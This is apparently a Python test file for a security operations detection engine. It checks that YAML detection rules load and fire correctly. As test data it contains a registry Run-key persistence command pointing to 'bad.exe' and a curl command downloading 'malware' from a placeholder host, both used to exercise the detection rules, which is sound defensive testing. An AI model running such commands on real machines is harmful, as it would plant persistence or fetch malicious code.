"""Declarative YAML rule loader tests."""
from pathlib import Path

from soc.detection.yaml_loader import load_yaml_rules
from soc.models import Case, TelemetryEvent
from soc.detection.engine import DetectionEngine


YAML_PATH = Path(__file__).resolve().parents[1] / "config" / "detection_rules" / "rules.yaml"


def test_yaml_rules_load():
    rules = load_yaml_rules(YAML_PATH)
    assert len(rules) >= 3
    ids = {r.rule_id for r in rules}
    assert "DET-Y-001" in ids
    assert "DET-Y-003" in ids


def test_yaml_rule_fires_on_persistence():
    rules = load_yaml_rules(YAML_PATH)
    engine = DetectionEngine()
    for r in rules:
        engine.register(r)
    case = Case()
    case.events.append(TelemetryEvent(
        source="edr", host="wkstn-1", process="reg.exe",
        command_line='reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d bad.exe',
    ))
    alerts = engine.run(case)
    assert any(a.rule_id == "DET-Y-003" for a in alerts)


def test_yaml_rule_respects_process_filter():
    rules = load_yaml_rules(YAML_PATH)
    engine = DetectionEngine()
    for r in rules:
        engine.register(r)
    case = Case()
    # curl invoked via powershell (not cmd.exe) should NOT match DET-Y-001
    case.events.append(TelemetryEvent(
        source="edr", host="wkstn-1", process="powershell.exe",
        command_line="curl http://example.com/malware",
    ))
    alerts = engine.run(case)
    assert all(a.rule_id != "DET-Y-001" for a in alerts)
